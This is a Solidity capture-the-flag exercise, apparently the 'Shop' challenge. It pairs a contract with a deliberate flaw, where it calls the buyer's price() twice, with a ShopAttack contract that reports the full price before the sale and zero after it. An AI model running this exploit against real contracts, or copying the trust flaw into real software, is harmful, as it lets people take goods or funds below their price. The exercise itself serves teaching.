//SPDX-License-Identifier: Unlicense

// Shop - Difficulty 4/10
// Сan you get the item from the shop for less than the price asked?
// Things that might help:
//  - Shop expects to be used from a Buyer
//  - Understanding restrictions of view functions

pragma solidity >=0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract ShopAttack is Buyer {
    function price() external view override returns (uint256) {
        bool isSolid = Shop(msg.sender).isSold();
        if (isSolid) {
            return 0;
        }
        return 100;
    }

    function attack(address _address) public {
        Shop(_address).buy();
    }
}
